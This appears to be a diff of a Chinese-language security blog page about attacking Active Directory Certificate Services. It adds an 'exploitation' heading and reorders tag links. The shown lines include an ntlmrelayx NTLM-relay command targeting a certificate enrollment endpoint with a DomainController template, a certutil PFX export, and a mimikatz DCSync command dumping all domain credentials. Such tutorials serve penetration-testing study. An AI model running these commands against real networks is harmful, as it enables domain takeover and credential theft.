@@ -671,7 +671,7 @@ certutil -user -exportPFX sha1 yangsirdomainuser.pfx<span aria-hidden="true" cla
 默认情况下，不会启用https，但是https本身不能抵抗NTLM中继！！！只有当https&amp;通道绑定相结合的时候，才能保护HTTPS服务免遭NTLM中继，ADCS没有为IIS上的身份验证启用扩展保护，并不能启用通道绑定！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816194325538.png"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这里要用的是impacket下的ntlmrelayx
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这里要用的是impacket下的ntlmrelayx
 开启监听
 python3 ntlmrelayx.py -t http://192.168.3.73/certsrv/certfnsh.asp -smb2support --adcs --template <span class="token string">'DomainController'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816195928550.png"></p>
@@ -939,12 +939,12 @@ lsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="
                         <span class="chip bg-color">Bypass</span>
                     </a>
                     
-                    <a href="/tags/Cobaltstrike/">
-                        <span class="chip bg-color">Cobaltstrike</span>
-                    </a>
-                    
                     <a href="/tags/Powershell/">
                         <span class="chip bg-color">Powershell</span>
+                    </a>
+                    
+                    <a href="/tags/Cobaltstrike/">
+                        <span class="chip bg-color">Cobaltstrike</span>
                     </a>
                     
                 </div>
